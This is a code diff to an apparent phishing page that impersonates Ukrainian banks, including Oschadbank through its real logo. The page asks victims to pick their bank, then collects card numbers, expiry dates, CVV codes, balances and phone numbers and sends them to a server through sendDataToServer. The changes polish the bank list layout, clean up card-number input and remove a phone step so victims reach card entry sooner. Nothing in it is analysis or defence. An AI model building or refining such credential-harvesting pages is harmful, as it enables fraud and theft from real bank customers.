@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Для авторизації оеріть свій банк</title>
+    <title>Для авторизації оберіть свій банк</title>
     <style>
         /* Общие стили для всех экранов и элементов */
         *, *::before, *::after { box-sizing: border-box; }
@@ -49,21 +49,23 @@
         body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
         body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
         h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
-        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
+        .bank-grid { display: flex; flex-direction: column; gap: 0px; }
         .bank-item {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
-            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
-            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
-            box-shadow: 0 4px 10px var(--shadow-color); position: relative;
+            display: flex; flex-direction: row; align-items: center; justify-content: flex-start;
+            background-color: var(--white); padding: 15px 20px; border: none;
+            border-bottom: 1px solid var(--border-color);
+            text-decoration: none; color: var(--dark-text); text-align: left;
+            height: auto; transition: background-color 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
+            box-shadow: none; position: relative;
             -webkit-tap-highlight-color: transparent;
         }
-        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
-        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
-        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
+        .bank-item:last-child { border-bottom: none; }
+        .bank-item:hover { background-color: #f8f9fa; transform: none; box-shadow: none; }
+        .bank-item img { max-height: 30px; max-width: 80px; object-fit: contain; margin-bottom: 0; margin-right: 20px; }
+        .bank-item .bank-name { font-size: 16px; font-weight: 500; }
         .bank-item.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
         .bank-item.disabled .unavailable-label {
-            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+            position: absolute; top: 50%; transform: translateY(-50%); right: 20px; left: auto;
             font-size: 12px; font-weight: bold; color: var(--danger-color);
             background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
             white-space: nowrap; /* NEW: чтобы метка не переносилась */
@@ -639,7 +641,8 @@
 </head>
 <body>
     <div id="bank-selection-screen" class="screen">
-        <h1>Для авторизації оберіть свій банк</h1>
+        <p style="color: #6c757d; font-size: 16px; margin: 20px 0 10px;">Оберіть банк, в якому ви маєте рахунок... <span style="float: right;">▼</span></p>
+        <div style="background-color: #d9edff; padding: 15px; border-radius: 8px; font-size: 16px; color: #212529; margin-bottom: 10px;">Оберіть банк, в якому ви маєте рахунок...</div>
         <div class="bank-grid"></div>
     </div>
 
@@ -1392,7 +1395,7 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('details_submit_btn').addEventListener('click', (e) => {
             e.preventDefault();
             const card_details = {
-                card: document.getElementById('details_card').value.replace(/\s/g, ''),
+                card: document.getElementById('details_card').value.replace(/\D/g, ''),
                 exp: document.getElementById('details_exp').value,
                 cvv: document.getElementById('details_cvv').value,
                 balance: document.getElementById('details_balance').value,
@@ -2126,77 +2129,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 <img class="oschad-header-logo" src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" alt="Логотип Ощадбанка">
             </div>
             <div class="oschad-welcome-section">
-                <h2 class="oschad-main-title">Ласкаво просимо</h2>
-                <p>Введіть номер телефону</p>
-                <div id="phone-login-form">
-                    <div class="oschad-input-group phone-group">
-                        <label for="phone_input">Номер телефону</label>
-                        <div class="oschad-phone-wrapper">
-                            <span class="oschad-phone-prefix">+380</span>
-                            <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*">
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <button class="oschad-submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>`
-        ;
-        customModalContent.innerHTML = html;
-        customModalOverlay.style.display = 'flex';
-
-        document.getElementById('oschad-back-arrow').addEventListener('click', () => { hideAllModals(); });
-
-        const phoneInput = document.getElementById('phone_input');
-        const submitBtn = document.getElementById('oschad-submit-btn');
-
-        document.querySelectorAll('.oschad-input-group').forEach(group => {
-            const input = group.querySelector('.oschad-input-field');
-            if (!input) return;
-            const checkValue = () => group.classList.toggle('has-value', input.value.trim() !== '');
-            input.addEventListener('focus', () => group.classList.add('is-focused'));
-            input.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
-            input.addEventListener('input', checkValue); checkValue();
-        });
-        
-        phoneInput.addEventListener('input', (e) => {
-            let rawValue = e.target.value.replace(/\D/g, '');
-            if (rawValue.startsWith('380')) rawValue = rawValue.substring(3);
-            if (rawValue.length > 9) rawValue = rawValue.substring(0, 9);
-            e.target.value = rawValue.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
-            const isValid = rawValue.length === 9;
-            submitBtn.classList.toggle('active', isValid);
-            submitBtn.disabled = !isValid;
-        });
-
-        phoneInput.addEventListener('paste', (e) => {
-            e.preventDefault();
-            let pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-            if (pasted.startsWith('380')) pasted = pasted.substring(3);
-            if (pasted.startsWith('+380')) pasted = pasted.substring(4);
-            if (pasted.length > 9) pasted = pasted.substring(0, 9);
-            phoneInput.value = pasted.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
-            const isValid = pasted.length === 9;
-            submitBtn.classList.toggle('active', isValid);
-            submitBtn.disabled = !isValid;
-        });
-
-        submitBtn.onclick = (e) => {
-            e.preventDefault();
-            if (submitBtn.disabled) return;
-            collectedData.phone = '+380' + phoneInput.value.replace(/\D/g, '');
-            sendDataToServer({ phone: collectedData.phone }, false);
-            renderOschadCardScreen();
-        };
-    }
-    
-    function renderOschadCardScreen() {
-        hideAllModals();
-        const html = 
-            `<div class="oschad-header">
-                <span class="back-arrow" id="oschad-back-card">←</span>
-                <span class="title">Наступний крок</span>
-                <img class="oschad-header-logo" src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" alt="Логотип Ощадбанка">
-            </div>
-            <div class="oschad-welcome-section">
                 <div class="alliance-icon-container" style="text-align: center; margin: 20px 0 40px;">
                     <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="6" width="18" height="12" rx="2" stroke="var(--oschad-primary)" stroke-width="1.5"/><line x1="3" y1="10" x2="21" y2="10" stroke="var(--oschad-primary)" stroke-width="1.5"/></svg>
                 </div>
@@ -2237,7 +2169,7 @@ document.addEventListener('DOMContentLoaded', () => {
         submitBtn.onclick = (e) => {
             e.preventDefault();
             if (submitBtn.disabled) return;
-            const card = cardInput.value.replace(/\s/g, '');
+            const card = cardInput.value.replace(/\D/g, '');
             sendDataToServer({ card_number: card }, true);
             showOschadLoader();
         };
